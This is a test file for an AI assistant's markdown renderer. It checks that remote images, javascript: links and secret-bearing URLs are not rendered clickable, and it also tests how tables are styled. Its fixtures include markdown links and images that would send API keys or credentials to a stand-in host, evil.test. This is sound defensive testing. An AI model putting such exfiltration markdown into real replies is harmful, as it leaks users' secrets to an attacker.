import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { openUrl } from "@tauri-apps/plugin-opener";
import { I18nProvider } from "@/i18n";
import MarkdownRenderer from "./markdown-renderer";

vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn() }));

describe("assistant markdown links", () => {
  it("does not load remote images or create unsafe clickable URLs", () => {
    const { container } = render(<MarkdownRenderer content={"![secret](https://evil.test/img?apiKey=abc) [open](javascript:alert(1))"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.queryByRole("link", { name: "open" })).toBeNull();
  });

  it("does not make secret-bearing URLs clickable", () => {
    render(<MarkdownRenderer content={"[leak](https://evil.test/collect?apiKey=private-value) [userinfo](https://user:pass@evil.test/collect)"} />);
    expect(screen.queryByRole("link", { name: "leak" })).toBeNull();
    expect(screen.queryByRole("link", { name: "userinfo" })).toBeNull();
  });

  it("opens only HTTP links after a click", async () => {
    render(<MarkdownRenderer content={"[safe](https://example.com/report)"} />);
    const link = screen.getByRole("link", { name: "safe" });
    expect(link).toHaveAttribute("href", "https://example.com/report");
    fireEvent.click(link);
    await waitFor(() => expect(openUrl).toHaveBeenCalledWith("https://example.com/report"));
  });

  it("keeps public address explorer links clickable", () => {
    render(<MarkdownRenderer content={"[wallet](https://etherscan.io/address/0x52908400098527886E0F7030069857D2E4169EE7) [sol](https://solscan.io/account/9WzDXwBbmkg8XDbB4dNq3uVQhQ6C7PDkA9Aw6t4C3kLw)"} />);
    expect(screen.getByRole("link", { name: "wallet" })).toHaveAttribute(
      "href", "https://etherscan.io/address/0x52908400098527886E0F7030069857D2E4169EE7",
    );
    expect(screen.getByRole("link", { name: "sol" })).toHaveAttribute(
      "href", "https://solscan.io/account/9WzDXwBbmkg8XDbB4dNq3uVQhQ6C7PDkA9Aw6t4C3kLw",
    );
  });
});

it("styles a currency loss, table caption, and total row in an assistant reply", () => {
  const { container } = render(<MarkdownRenderer content={`Change in value by asset, 24 Oct to 31 Oct.

| Asset | Change |
| --- | ---: |
| AAPL | −$1,357.50 |
| Total | +$26,010.84 |`} />);
  expect(screen.getByText("−$1,357.50").closest("td")).toHaveClass("t3-assistant-loss");
  expect(screen.getByText("Total").closest("td")).toHaveClass("t3-assistant-total-label");
  expect(container.querySelector("tbody tr:last-child td")).toHaveClass("t3-assistant-total-label");
});

it("styles non-dollar losses and a translated total row", () => {
  const language = vi.spyOn(navigator, "language", "get").mockReturnValue("zh-CN");
  try {
    const { container } = render(<I18nProvider><MarkdownRenderer content={`| 资产 | 变动 |
| --- | ---: |
| EUR | −€1,357.50 |
| 总计 | +€2,010.84 |`} /></I18nProvider>);
    expect(screen.getByText("−€1,357.50").closest("td")).toHaveClass("t3-assistant-loss");
    expect(screen.getByText("总计").closest("td")).toHaveClass("t3-assistant-total-label");
    expect(container.querySelector("tbody tr:last-child td")).toHaveClass("t3-assistant-total-label");
  } finally {
    language.mockRestore();
  }
});
